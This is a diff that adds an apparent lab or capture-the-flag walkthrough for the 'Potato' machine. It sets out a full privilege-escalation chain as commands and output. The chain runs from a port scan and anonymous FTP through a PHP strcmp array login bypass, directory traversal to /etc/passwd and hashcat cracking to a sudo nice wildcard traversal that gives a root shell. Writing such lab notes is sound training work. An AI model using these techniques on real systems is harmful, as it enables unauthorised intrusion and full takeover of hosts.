@@ -1,0 +1,61 @@
+$ sudo nmap -sCV -p- -v -T4 -sT --open 192.168.186.101 > PotatoNmap.txt
+2112/tcp open  ftp     ProFTPD
+| ftp-anon: Anonymous FTP login allowed (FTP code 230)
+| -rw-r--r--   1 ftp      ftp           901 Aug  2  2020 index.php.bak
+|_-rw-r--r--   1 ftp      ftp            54 Aug  2  2020 welcome.msg
+
+$ ftp 192.168.186.101 -p 2112
+get these two files.
+─$ cat index.php.bak
+found if (strcmp($_POST['username'], "admin") == 0  && strcmp($_POST['password'], $pass) == 0)
+
+$ feroxbuster -u http://192.168.186.101 -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt
+Found:
+http://192.168.186.101/admin  # Login page
+http://192.168.186.101/admin/logs
+
+
+In burpsuite Change the body of the POST request from:
+username=admin&password=potato
+to:
+username=admin&password[]=any_value
+successfully get in to dashboard.php
+
+Turn Intercept ON in Burp.
+Go to the login page in browser, type admin and potato. Click Login.
+In Burp, find the request. Change password=potato to password[]=potato.
+Click Forward.
+Turn Intercept OFF. The browser will now receive the "Welcome" response and the cookie directly.
+
+In burpsuite, Found 
+POST /admin/dashboard.php?page=log
+file=log_01.txt
+
+In response, shows content of log_01.txt
+
+Modify request to file=../../../../../../../../../etc/passwd
+Found webadmin:$1$webadmin$3sXBxGUtDGIFAcnNTNhi6/:1001:1001:webadmin,,,:/home/webadmin:/bin/bash
+$ hashcat -m 500 hash.txt /usr/share/wordlists/rockyou.txt
+$1$webadmin$3sXBxGUtDGIFAcnNTNhi6/:dragon
+
+access in with ssh webadmin:dragon@192.168.186.101
+
+$ sudo -l
+Matching Defaults entries for webadmin on serv:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User webadmin may run the following commands on serv:
+    (ALL : ALL) /bin/nice /notes/*
+
+Above sudo -l output tells: webadmin can run the /bin/nice command as any user (including root) but only when it is targeting files inside the /notes/ directory.
+
+sudo /bin/nice /notes/../bin/sh
+get root shell here. ###############################################
+
+/bin/nice: This utility is used to run a program with a modified scheduling priority. Crucially, nice acts as a wrapper. If you run nice /bin/sh, it executes /bin/sh.
+The Wildcard (/notes/*): The sudo rule allows you to run nice on anything inside that folder. If there is a script there, you can run it as root.
+
+The Vulnerability: Path Traversal in Sudo
+Because the wildcard is at the end of the path (/notes/*), you can attempt to use Directory Traversal (../) to trick nice into executing binaries outside of that folder, while still "satisfying" the sudo rule's requirement that the string starts with /notes/.
+
